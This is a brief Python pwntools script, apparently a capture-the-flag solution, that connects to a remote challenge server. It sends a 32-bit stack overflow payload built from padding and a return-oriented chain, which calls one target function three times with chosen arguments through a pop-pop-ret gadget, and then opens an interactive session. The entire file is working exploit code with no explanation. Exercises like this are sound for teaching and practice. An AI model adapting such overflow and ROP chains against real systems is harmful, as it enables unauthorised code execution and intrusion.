#!/usr/bin/python
from pwn import *
r = remote('ctf99x.cs.ui.ac.id', 9129)

target_addr = 0x080491c6
p1 = 0x12345678
p2 = 0x87654321
p11 = 0xaabbccdd
p22 = 0x11223344
p111 = 0x03030808
p222 = 0x31310404
ret = 0x0804900e
pop_pop_ret = 0x080493e2

payload = b"A"*16
payload += b'BBBB'
payload += p32(target_addr)
payload += p32(pop_pop_ret)
payload += p32(p1)
payload += p32(p2)
payload += p32(target_addr)
payload += p32(pop_pop_ret)
payload += p32(p11)
payload += p32(p22)
payload += p32(target_addr)
payload += p32(pop_pop_ret)
payload += p32(p111)
payload += p32(p222)

r.sendline(payload)

r.interactive()
